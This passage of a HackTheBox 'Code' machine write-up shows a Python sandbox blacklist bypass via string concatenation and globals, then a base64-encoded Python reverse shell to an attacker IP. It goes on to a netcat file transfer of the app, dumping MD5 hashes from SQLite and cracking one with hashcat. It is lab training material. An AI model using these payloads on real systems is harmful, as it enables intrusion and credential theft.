+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#blacklist-bypass" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>If our python code is running, we can try directly popping a reverse shell. However, playing around with some python leads to some issues&hellip;
+
+
+
+
+
+
+
+<figure>
+      <img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt="Failed injection attempt"
+    srcset="
+      /crocpit/hackthebox/code/web-2_hu_24f5ce4697880ef0.png  330w,
+      /crocpit/hackthebox/code/web-2_hu_4f8076735a2e1e09.png  660w,
+      /crocpit/hackthebox/code/web-2_hu_9f5e450648c2a3b.png 1280w
+    "
+    data-zoom-src="/crocpit/hackthebox/code/web-2.png"
+    src="/crocpit/hackthebox/code/web-2.png">
+
+  
+</figure>
+</p>
+<p>There seems to be some kind of filter. After some testing, we can determine the filter to be a blacklist on the entire input string.</p>
+<p>
+
+
+
+
+
+
+<figure>
+      <img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt="Verifying filter blacklist"
+    srcset="
+      /crocpit/hackthebox/code/web-3_hu_94859b3ffee6006a.png  330w,
+      /crocpit/hackthebox/code/web-3_hu_b5a9958c48c37936.png  660w,
+      /crocpit/hackthebox/code/web-3_hu_1db5adfc5c2a514f.png 1280w
+    "
+    data-zoom-src="/crocpit/hackthebox/code/web-3.png"
+    src="/crocpit/hackthebox/code/web-3.png">
+
+  
+</figure>
+</p>
+<p>As you can see, &ldquo;os&rdquo; is filtered despite only being called in a print statement. I believe this filter is probably only being run on the user input on the web back-end. We can test this theory by trying to print &ldquo;os&rdquo; without directly having the string &ldquo;os&rdquo; sent though the webapp.</p>
+<p>
+
+
+
+
+
+
+<figure>
+      <img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt="Bypassing the filter"
+    srcset="
+      /crocpit/hackthebox/code/web-4_hu_f5fe20f2b5b04ab6.png  330w,
+      /crocpit/hackthebox/code/web-4_hu_10226344413676b0.png  660w,
+      /crocpit/hackthebox/code/web-4_hu_e5df6ffba5f57011.png 1280w
+    "
+    data-zoom-src="/crocpit/hackthebox/code/web-4.png"
+    src="/crocpit/hackthebox/code/web-4.png">
+
+  
+</figure>
+</p>
+<p>Ezpz. We&rsquo;ve proven that we can bypass the web filter while running &ldquo;malicious&rdquo; code. Now we have to somehow come up with bypassable code that runs a reverse shell.</p>
+
+<h3 class="relative group">Popping The Shell 
+    <div id="popping-the-shell" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#popping-the-shell" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>We know that we can bypass the filter using string concatenation, so let&rsquo;s figure out how to call python functions with string literals.</p>
+<p>The question we must ask ourselves is: <em>how are functions called in python?</em>. If we were to look at a compiled language like C, the compiler creates a data structure called the <a
+  href="https://en.wikipedia.org/wiki/Symbol_table"
+    target="_blank"
+  >Symbol Table</a>. Python also has a symbol table that gets created during bytecode compilation; however, it also has dynamic structures called <em>namespaces</em> that get created at runtime.</p>
+<p>We can use these namespaces to see what global/built-in functions are available, then call them with <strong>string literals</strong>.</p>
+<p>If we look at the normal built-in functions, we can see some useful modules and functions.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ python -c <span class="s2">&#34;print(dir(__builtins__))&#34;</span>       
+</span></span><span class="line"><span class="cl"><span class="o">[</span><span class="s1">&#39;ArithmeticError&#39;</span>, <span class="s1">&#39;AssertionError&#39;</span>, <span class="s1">&#39;AttributeError&#39;</span>, <span class="s1">&#39;BaseException&#39;</span>, <span class="s1">&#39;BaseExceptionGroup&#39;</span>, <span class="s1">&#39;BlockingIOError&#39;</span>, <span class="s1">&#39;BrokenPipeError&#39;</span>, <span class="s1">&#39;BufferError&#39;</span>, <span class="s1">&#39;BytesWarning&#39;</span>, <span class="s1">&#39;ChildProcessError&#39;</span>, <span class="s1">&#39;ConnectionAbortedError&#39;</span>, <span class="s1">&#39;ConnectionError&#39;</span>, <span class="s1">&#39;ConnectionRefusedError&#39;</span>, <span class="s1">&#39;ConnectionResetError&#39;</span>, <span class="s1">&#39;DeprecationWarning&#39;</span>, <span class="s1">&#39;EOFError&#39;</span>, <span class="s1">&#39;Ellipsis&#39;</span>, <span class="s1">&#39;EncodingWarning&#39;</span>, <span class="s1">&#39;EnvironmentError&#39;</span>, <span class="s1">&#39;Exception&#39;</span>, <span class="s1">&#39;ExceptionGroup&#39;</span>, <span class="s1">&#39;False&#39;</span>, <span class="s1">&#39;FileExistsError&#39;</span>, <span class="s1">&#39;FileNotFoundError&#39;</span>, <span class="s1">&#39;FloatingPointError&#39;</span>, <span class="s1">&#39;FutureWarning&#39;</span>, <span class="s1">&#39;GeneratorExit&#39;</span>, <span class="s1">&#39;IOError&#39;</span>, <span class="s1">&#39;ImportError&#39;</span>, <span class="s1">&#39;ImportWarning&#39;</span>, <span class="s1">&#39;IndentationError&#39;</span>, <span class="s1">&#39;IndexError&#39;</span>, <span class="s1">&#39;InterruptedError&#39;</span>, <span class="s1">&#39;IsADirectoryError&#39;</span>, <span class="s1">&#39;KeyError&#39;</span>, <span class="s1">&#39;KeyboardInterrupt&#39;</span>, <span class="s1">&#39;LookupError&#39;</span>, <span class="s1">&#39;MemoryError&#39;</span>, <span class="s1">&#39;ModuleNotFoundError&#39;</span>, <span class="s1">&#39;NameError&#39;</span>, <span class="s1">&#39;None&#39;</span>, <span class="s1">&#39;NotADirectoryError&#39;</span>, <span class="s1">&#39;NotImplemented&#39;</span>, <span class="s1">&#39;NotImplementedError&#39;</span>, <span class="s1">&#39;OSError&#39;</span>, <span class="s1">&#39;OverflowError&#39;</span>, <span class="s1">&#39;PendingDeprecationWarning&#39;</span>, <span class="s1">&#39;PermissionError&#39;</span>, <span class="s1">&#39;ProcessLookupError&#39;</span>, <span class="s1">&#39;PythonFinalizationError&#39;</span>, <span class="s1">&#39;RecursionError&#39;</span>, <span class="s1">&#39;ReferenceError&#39;</span>, <span class="s1">&#39;ResourceWarning&#39;</span>, <span class="s1">&#39;RuntimeError&#39;</span>, <span class="s1">&#39;RuntimeWarning&#39;</span>, <span class="s1">&#39;StopAsyncIteration&#39;</span>, <span class="s1">&#39;StopIteration&#39;</span>, <span class="s1">&#39;SyntaxError&#39;</span>, <span class="s1">&#39;SyntaxWarning&#39;</span>, <span class="s1">&#39;SystemError&#39;</span>, <span class="s1">&#39;SystemExit&#39;</span>, <span class="s1">&#39;TabError&#39;</span>, <span class="s1">&#39;TimeoutError&#39;</span>, <span class="s1">&#39;True&#39;</span>, <span class="s1">&#39;TypeError&#39;</span>, <span class="s1">&#39;UnboundLocalError&#39;</span>, <span class="s1">&#39;UnicodeDecodeError&#39;</span>, <span class="s1">&#39;UnicodeEncodeError&#39;</span>, <span class="s1">&#39;UnicodeError&#39;</span>, <span class="s1">&#39;UnicodeTranslateError&#39;</span>, <span class="s1">&#39;UnicodeWarning&#39;</span>, <span class="s1">&#39;UserWarning&#39;</span>, <span class="s1">&#39;ValueError&#39;</span>, <span class="s1">&#39;Warning&#39;</span>, <span class="s1">&#39;ZeroDivisionError&#39;</span>, <span class="s1">&#39;_IncompleteInputError&#39;</span>, <span class="s1">&#39;__build_class__&#39;</span>, <span class="s1">&#39;__debug__&#39;</span>, <span class="s1">&#39;__doc__&#39;</span>, <span class="s1">&#39;__import__&#39;</span>, <span class="s1">&#39;__loader__&#39;</span>, <span class="s1">&#39;__name__&#39;</span>, <span class="s1">&#39;__package__&#39;</span>, <span class="s1">&#39;__spec__&#39;</span>, <span class="s1">&#39;abs&#39;</span>, <span class="s1">&#39;aiter&#39;</span>, <span class="s1">&#39;all&#39;</span>, <span class="s1">&#39;anext&#39;</span>, <span class="s1">&#39;any&#39;</span>, <span class="s1">&#39;ascii&#39;</span>, <span class="s1">&#39;bin&#39;</span>, <span class="s1">&#39;bool&#39;</span>, <span class="s1">&#39;breakpoint&#39;</span>, <span class="s1">&#39;bytearray&#39;</span>, <span class="s1">&#39;bytes&#39;</span>, <span class="s1">&#39;callable&#39;</span>, <span class="s1">&#39;chr&#39;</span>, <span class="s1">&#39;classmethod&#39;</span>, <span class="s1">&#39;compile&#39;</span>, <span class="s1">&#39;complex&#39;</span>, <span class="s1">&#39;copyright&#39;</span>, <span class="s1">&#39;credits&#39;</span>, <span class="s1">&#39;delattr&#39;</span>, <span class="s1">&#39;dict&#39;</span>, <span class="s1">&#39;dir&#39;</span>, <span class="s1">&#39;divmod&#39;</span>, <span class="s1">&#39;enumerate&#39;</span>, <span class="s1">&#39;eval&#39;</span>, <span class="s1">&#39;exec&#39;</span>, <span class="s1">&#39;exit&#39;</span>, <span class="s1">&#39;filter&#39;</span>, <span class="s1">&#39;float&#39;</span>, <span class="s1">&#39;format&#39;</span>, <span class="s1">&#39;frozenset&#39;</span>, <span class="s1">&#39;getattr&#39;</span>, <span class="s1">&#39;globals&#39;</span>, <span class="s1">&#39;hasattr&#39;</span>, <span class="s1">&#39;hash&#39;</span>, <span class="s1">&#39;help&#39;</span>, <span class="s1">&#39;hex&#39;</span>, <span class="s1">&#39;id&#39;</span>, <span class="s1">&#39;input&#39;</span>, <span class="s1">&#39;int&#39;</span>, <span class="s1">&#39;isinstance&#39;</span>, <span class="s1">&#39;issubclass&#39;</span>, <span class="s1">&#39;iter&#39;</span>, <span class="s1">&#39;len&#39;</span>, <span class="s1">&#39;license&#39;</span>, <span class="s1">&#39;list&#39;</span>, <span class="s1">&#39;locals&#39;</span>, <span class="s1">&#39;map&#39;</span>, <span class="s1">&#39;max&#39;</span>, <span class="s1">&#39;memoryview&#39;</span>, <span class="s1">&#39;min&#39;</span>, <span class="s1">&#39;next&#39;</span>, <span class="s1">&#39;object&#39;</span>, <span class="s1">&#39;oct&#39;</span>, <span class="s1">&#39;open&#39;</span>, <span class="s1">&#39;ord&#39;</span>, <span class="s1">&#39;pow&#39;</span>, <span class="s1">&#39;print&#39;</span>, <span class="s1">&#39;property&#39;</span>, <span class="s1">&#39;quit&#39;</span>, <span class="s1">&#39;range&#39;</span>, <span class="s1">&#39;repr&#39;</span>, <span class="s1">&#39;reversed&#39;</span>, <span class="s1">&#39;round&#39;</span>, <span class="s1">&#39;set&#39;</span>, <span class="s1">&#39;setattr&#39;</span>, <span class="s1">&#39;slice&#39;</span>, <span class="s1">&#39;sorted&#39;</span>, <span class="s1">&#39;staticmethod&#39;</span>, <span class="s1">&#39;str&#39;</span>, <span class="s1">&#39;sum&#39;</span>, <span class="s1">&#39;super&#39;</span>, <span class="s1">&#39;tuple&#39;</span>, <span class="s1">&#39;type&#39;</span>, <span class="s1">&#39;vars&#39;</span>, <span class="s1">&#39;zip&#39;</span><span class="o">]</span>
+</span></span></code></pre></div><p>If you look closely the blacklisted &ldquo;exec&rdquo; and &ldquo;<strong>import</strong>&rdquo; are built-in. If we can somehow gain access to the <em><strong>builtins</strong></em> object, we could call them; however, &ldquo;builtins&rdquo; is also blacklisted.</p>
+<p>Luckily, the <em>globals</em> namespace gives us access to a dictionary that maps names to global objects.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ python -c <span class="s2">&#34;print(globals())&#34;</span>                      
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s1">&#39;__name__&#39;</span>: <span class="s1">&#39;__main__&#39;</span>, <span class="s1">&#39;__doc__&#39;</span>: None, <span class="s1">&#39;__package__&#39;</span>: None, <span class="s1">&#39;__loader__&#39;</span>: &lt;class <span class="s1">&#39;_frozen_importlib.BuiltinImporter&#39;</span>&gt;, <span class="s1">&#39;__spec__&#39;</span>: None, <span class="s1">&#39;__annotations__&#39;</span>: <span class="o">{}</span>, <span class="s1">&#39;__builtins__&#39;</span>: &lt;module <span class="s1">&#39;builtins&#39;</span> <span class="o">(</span>built-in<span class="o">)</span>&gt;<span class="o">}</span>
+</span></span></code></pre></div><p>Would you look at that, globals maps a string key to the <strong>builtins</strong> object, so we can call it with a concatenated string!</p>
+<p>
+
+
+
+
+
+
+<figure>
+      <img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt="Accessing builtin functions"
+    srcset="
+      /crocpit/hackthebox/code/web-5_hu_1e0dca2539232135.png  330w,
+      /crocpit/hackthebox/code/web-5_hu_f0dcdf430a781955.png  660w,
+      /crocpit/hackthebox/code/web-5_hu_6e46872dd7b966e6.png 1280w
+    "
+    data-zoom-src="/crocpit/hackthebox/code/web-5.png"
+    src="/crocpit/hackthebox/code/web-5.png">
+
+  
+</figure>
+</p>
+<p>Oh, did I mention &ldquo;globals&rdquo; isn&rsquo;t blacklisted :)? I guess the lesson is, if you are going ot make a blacklist, you better make sure you blacklist <em>everything</em>. Better yet, just do something other than a blacklist -_-.</p>
+<p>With access to builtin functions, let&rsquo;s just try calling exec to see what happens.</p>
+<p>
+
+
+
+
+
+
+<figure>
+      <img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt="Calling exec"
+    srcset="
+      /crocpit/hackthebox/code/web-6_hu_d171f79c718d1ab3.png  330w,
+      /crocpit/hackthebox/code/web-6_hu_fd4a0376ac35363a.png  660w,
+      /crocpit/hackthebox/code/web-6_hu_9ca04e86ff06b0ce.png 1280w
+    "
+    data-zoom-src="/crocpit/hackthebox/code/web-6.png"
+    src="/crocpit/hackthebox/code/web-6.png">
+
+  
+</figure>
+</p>
+<p>Ruh-roh, looks like I can call exec on python code as a string! Now all we have to do is create python code that doesn&rsquo;t directly have blacklisted terms. This can be easily accomplished by base64 encoding some python code, then passing the decoded string to exec.</p>
+<p>Let&rsquo;s encode a python reverse shell into base64</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ <span class="nb">echo</span> -n <span class="s1">&#39;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.14.2&#34;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&#34;/bin/sh&#34;)&#39;</span> <span class="p">|</span> base64 -w <span class="m">0</span>
+</span></span><span class="line"><span class="cl">aW1wb3J0IHNvY2tldCxvcyxwdHk7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTAuMTAuMTQuMiIsNDQ0NCkpO29zLmR1cDIocy5maWxlbm8oKSwwKTtvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO3B0eS5zcGF3bigiL2Jpbi9zaCIp
+</span></span></code></pre></div><p>And have ChatGPT generate some base64 decoding code and we have:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">ex</span> <span class="o">=</span> <span class="nb">globals</span><span class="p">()[</span><span class="s2">&#34;__buil&#34;</span><span class="o">+</span><span class="s2">&#34;tins__&#34;</span><span class="p">][</span><span class="s2">&#34;exe&#34;</span><span class="o">+</span><span class="s2">&#34;c&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Base64 decoding table</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Function to decode base64 without</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">base64_decode</span><span class="p">(</span><span class="n">encoded_str</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">base64_chars</span> <span class="o">=</span> <span class="s2">&#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">padding</span> <span class="o">=</span> <span class="s2">&#34;=&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># Create a dictionary for base64 characters</span>
+</span></span><span class="line"><span class="cl">    <span class="n">base64_map</span> <span class="o">=</span> <span class="p">{</span><span class="n">base64_chars</span><span class="p">[</span><span class="n">i</span><span class="p">]:</span> <span class="n">i</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">64</span><span class="p">)}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># Remove padding</span>
+</span></span><span class="line"><span class="cl">    <span class="n">encoded_str</span> <span class="o">=</span> <span class="n">encoded_str</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="n">padding</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># Convert the encoded string to binary</span>
+</span></span><span class="line"><span class="cl">    <span class="n">binary_str</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">encoded_str</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">binary_str</span> <span class="o">+=</span> <span class="nb">format</span><span class="p">(</span><span class="n">base64_map</span><span class="p">[</span><span class="n">char</span><span class="p">],</span> <span class="s1">&#39;06b&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># Group the binary string into 8-bit chunks (bytes)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">byte_chunks</span> <span class="o">=</span> <span class="p">[</span><span class="n">binary_str</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">8</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">binary_str</span><span class="p">),</span> <span class="mi">8</span><span class="p">)]</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># Convert binary chunks to characters</span>
+</span></span><span class="line"><span class="cl">    <span class="n">decoded_bytes</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">chunk</span> <span class="ow">in</span> <span class="n">byte_chunks</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">decoded_bytes</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">chunk</span><span class="p">,</span> <span class="mi">2</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># Join the decoded characters to form the final decoded string</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">decoded_bytes</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">encoded_str</span> <span class="o">=</span> <span class="s1">&#39;aW1wb3J0IHNvY2tldCxvcyxwdHk7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTAuMTAuMTQuMiIsNDQ0NCkpO29zLmR1cDIocy5maWxlbm8oKSwwKTtvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO3B0eS5zcGF3bigiL2Jpbi9zaCIp&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">decoded_str</span> <span class="o">=</span> <span class="n">base64_decode</span><span class="p">(</span><span class="n">encoded_str</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">decoded_str</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">ex</span><span class="p">(</span><span class="n">decoded_str</span><span class="p">)</span>
+</span></span></code></pre></div><p>Phew! Finally, we can start a Netcat listener and pop the shell!</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ nc -lvnp <span class="m">4444</span>        
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> ...
+</span></span></code></pre></div><p>
+
+
+
+
+
+
+<figure>
+      <img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt="Popping a shell!"
+    srcset="
+      /crocpit/hackthebox/code/shell-1_hu_9f43eee986cffe48.png  330w,
+      /crocpit/hackthebox/code/shell-1_hu_9198c9538adcf3a2.png  660w,
+      /crocpit/hackthebox/code/shell-1_hu_750bb0edac8f2fd8.png 1280w
+    "
+    data-zoom-src="/crocpit/hackthebox/code/shell-1.png"
+    src="/crocpit/hackthebox/code/shell-1.png">
+
+  
+</figure>
+</p>
+<p>Shell popped! We are a un-privileged user and the shell dies every 2-ish minutes, but we&rsquo;re in!</p>
+<p>Going one directory up, we see the user.txt!</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ <span class="nb">cd</span> ..
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> ..
+</span></span><span class="line"><span class="cl">$ cat user.txt
+</span></span><span class="line"><span class="cl">cat user.txt
+</span></span><span class="line"><span class="cl">&lt;REDACTED&gt;
+</span></span></code></pre></div>
+<h2 class="relative group">Privesc to martin 
+    <div id="privesc-to-martin" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#privesc-to-martin" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>The first thing I saw was that we have access to the app&rsquo;s backend. Usually, I would upgrade my shell, but the connection dies too often for that to matter. The connection also dies too quickly for us to properly do on-net analysis, thus we zip the entire directory and tranfer it to our attack host to take our sweet time.</p>
+<p>You could implement some persistence measures here, but meh.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ <span class="nb">pwd</span>
+</span></span><span class="line"><span class="cl"><span class="nb">pwd</span>
+</span></span><span class="line"><span class="cl">/home/app-production/app
+</span></span><span class="line"><span class="cl">$ <span class="nb">cd</span> ..
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> ..
+</span></span><span class="line"><span class="cl">$ ls
+</span></span><span class="line"><span class="cl">ls
+</span></span><span class="line"><span class="cl">app  user.txt
+</span></span><span class="line"><span class="cl">$ tar -czvf app.tar.gz app
+</span></span><span class="line"><span class="cl">tar -czvf app.tar.gz app
+</span></span><span class="line"><span class="cl">app/
+</span></span><span class="line"><span class="cl">app/app.py
+</span></span><span class="line"><span class="cl">app/static/
+</span></span><span class="line"><span class="cl">app/static/css/
+</span></span><span class="line"><span class="cl">app/static/css/styles.css
+</span></span><span class="line"><span class="cl">app/templates/
+</span></span><span class="line"><span class="cl">app/templates/index.html
+</span></span><span class="line"><span class="cl">app/templates/codes.html
+</span></span><span class="line"><span class="cl">app/templates/register.html
+</span></span><span class="line"><span class="cl">app/templates/login.html
+</span></span><span class="line"><span class="cl">app/templates/about.html
+</span></span><span class="line"><span class="cl">app/__pycache__/
+</span></span><span class="line"><span class="cl">app/__pycache__/app.cpython-38.pyc
+</span></span><span class="line"><span class="cl">app/instance/
+</span></span><span class="line"><span class="cl">app/instance/database.db
+</span></span><span class="line"><span class="cl">$ ls
+</span></span><span class="line"><span class="cl">ls
+</span></span><span class="line"><span class="cl">app app.tar.gz user.txt
+</span></span></code></pre></div><p>We can transfer the file to our attack host with Netcat.</p>
+<p>
+
+
+
+
+
+
+<figure>
+      <img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt="File upload"
+    srcset="
+      /crocpit/hackthebox/code/privesc-1_hu_6a0a34ad944ece94.png  330w,
+      /crocpit/hackthebox/code/privesc-1_hu_4f1740b1ae7dd30.png  660w,
+      /crocpit/hackthebox/code/privesc-1_hu_99280fb526554740.png 1280w
+    "
+    data-zoom-src="/crocpit/hackthebox/code/privesc-1.png"
+    src="/crocpit/hackthebox/code/privesc-1.png">
+
+  
+</figure>
+</p>
+<p>We can then unzip it to inspect.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ tar xvf app.tar.gz                          
+</span></span><span class="line"><span class="cl">app/
+</span></span><span class="line"><span class="cl">app/app.py
+</span></span><span class="line"><span class="cl">app/static/
+</span></span><span class="line"><span class="cl">app/static/css/
+</span></span><span class="line"><span class="cl">app/static/css/styles.css
+</span></span><span class="line"><span class="cl">app/templates/
+</span></span><span class="line"><span class="cl">app/templates/index.html
+</span></span><span class="line"><span class="cl">app/templates/codes.html
+</span></span><span class="line"><span class="cl">app/templates/register.html
+</span></span><span class="line"><span class="cl">app/templates/login.html
+</span></span><span class="line"><span class="cl">app/templates/about.html
+</span></span><span class="line"><span class="cl">app/__pycache__/
+</span></span><span class="line"><span class="cl">app/__pycache__/app.cpython-38.pyc
+</span></span><span class="line"><span class="cl">app/instance/
+</span></span><span class="line"><span class="cl">app/instance/database.db
+</span></span></code></pre></div><p>And we find an interesting file.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/app/instance<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ ls
+</span></span><span class="line"><span class="cl">database.db
+</span></span><span class="line"><span class="cl">                                                                                                                                                                                                                                             
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/app/instance<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ file database.db                                                                                                                                        
+</span></span><span class="line"><span class="cl">database.db: SQLite 3.x database, last written using SQLite version 3031001, file counter 14, database pages 4, cookie 0x2, schema 4, UTF-8, version-valid-for <span class="m">14</span>
+</span></span></code></pre></div><p>Throwing it into sqlite, we can get creds for the <em>martin</em> user.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/app/instance<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ sqlite3 database.db
+</span></span><span class="line"><span class="cl">SQLite version 3.46.1 2024-08-13 09:16:08
+</span></span><span class="line"><span class="cl">Enter <span class="s2">&#34;.help&#34;</span> <span class="k">for</span> usage hints.
+</span></span><span class="line"><span class="cl">sqlite&gt; .databases
+</span></span><span class="line"><span class="cl">main: /home/kali/app/instance/database.db r/w
+</span></span><span class="line"><span class="cl">sqlite&gt; .tables
+</span></span><span class="line"><span class="cl">code  user
+</span></span><span class="line"><span class="cl">sqlite&gt; <span class="k">select</span> * from user<span class="p">;</span>
+</span></span><span class="line"><span class="cl">1<span class="p">|</span>development<span class="p">|</span>759b74ce43947f5f4c91aeddc3e5bad3
+</span></span><span class="line"><span class="cl">2<span class="p">|</span>martin<span class="p">|</span>3de6f30c4a09c27fc71932bfc68474be
+</span></span></code></pre></div><p>Those look like MD5 hashes. We can throw them into hashcat to get the password.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/app/instance<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ hashcat -m <span class="m">0</span> 3de6f30c4a09c27fc71932bfc68474be /usr/share/wordlists/rockyou.txt
+</span></span><span class="line"><span class="cl">&lt;SNIP&gt;
+</span></span><span class="line"><span class="cl">3de6f30c4a09c27fc71932bfc68474be:nafeelswordsmaster
+</span></span></code></pre></div><p>Using this, we can log into the martin user without our shell dying every second :).</p>
